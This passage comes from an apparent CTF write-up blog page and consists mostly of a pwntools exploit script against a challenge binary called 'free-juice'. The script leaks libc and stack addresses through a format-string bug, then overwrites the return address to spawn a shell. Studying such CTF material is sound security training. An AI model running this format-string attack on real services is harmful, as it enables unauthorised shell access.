+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>#p = process(&#39;./free-juice&#39;)</span>
+</span></span><span style=display:flex><span>p <span style=color:#f92672>=</span> remote(<span style=color:#e6db74>&#39;13.229.84.41&#39;</span>, <span style=color:#ae81ff>10001</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>context<span style=color:#f92672>.</span>binary <span style=color:#f92672>=</span> elf <span style=color:#f92672>=</span> ELF(<span style=color:#e6db74>&#39;./free-juice&#39;</span>)
+</span></span><span style=display:flex><span>libc <span style=color:#f92672>=</span> ELF(<span style=color:#e6db74>&#34;./lib/libc-2.23.so&#34;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>p<span style=color:#f92672>.</span>sendline(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;1&#39;</span>)
+</span></span><span style=display:flex><span>p<span style=color:#f92672>.</span>sendline(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;1&#39;</span>)
+</span></span><span style=display:flex><span>p<span style=color:#f92672>.</span>sendline(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;1337&#39;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>payload <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;%2$p.%12$p&#39;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>p<span style=color:#f92672>.</span>sendline(payload)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>p<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39; : &#39;</span>)
+</span></span><span style=display:flex><span><span style=color:#75715e># libc leak</span>
+</span></span><span style=display:flex><span>leak <span style=color:#f92672>=</span> p<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;.&#39;</span>)<span style=color:#f92672>.</span>strip(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;.&#39;</span>)
+</span></span><span style=display:flex><span><span style=color:#75715e># stack leak</span>
+</span></span><span style=display:flex><span>stack_leak <span style=color:#f92672>=</span> p<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#39;</span>)<span style=color:#f92672>.</span>strip(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#39;</span>)
+</span></span><span style=display:flex><span>print(leak)
+</span></span><span style=display:flex><span>print(stack_leak)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>libc<span style=color:#f92672>.</span>address <span style=color:#f92672>=</span> int(leak, <span style=color:#ae81ff>16</span>) <span style=color:#f92672>-</span> <span style=color:#ae81ff>0x3c6780</span>
+</span></span><span style=display:flex><span>ret_addr <span style=color:#f92672>=</span> int(stack_leak, <span style=color:#ae81ff>16</span>) <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x8</span>
+</span></span><span style=display:flex><span>shell <span style=color:#f92672>=</span> libc<span style=color:#f92672>.</span>address <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x45226</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>p<span style=color:#f92672>.</span>sendline(fmtstr_payload(<span style=color:#ae81ff>6</span>, {ret_addr: shell}))
+</span></span><span style=display:flex><span>p<span style=color:#f92672>.</span>sendline(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;4&#39;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>p<span style=color:#f92672>.</span>interactive()
+</span></span></code></pre></div></section><div class=post-tags></div></article></main><footer><div style=display:flex><a class=soc href=https://github.com/kestryix rel=me title=GitHub><i data-feather=github></i></a>
+<a class=border></a><a class=soc href=https://twitter.com/kestryix/ rel=me title=Twitter><i data-feather=twitter></i></a>
+<a class=border></a></div><div class=footer-info>2024 <a href=https://github.com/athul/archie>Archie Theme</a> | Built with <a href=https://gohugo.io>Hugo</a></div></footer><script>feather.replace()</script></div></body></html>
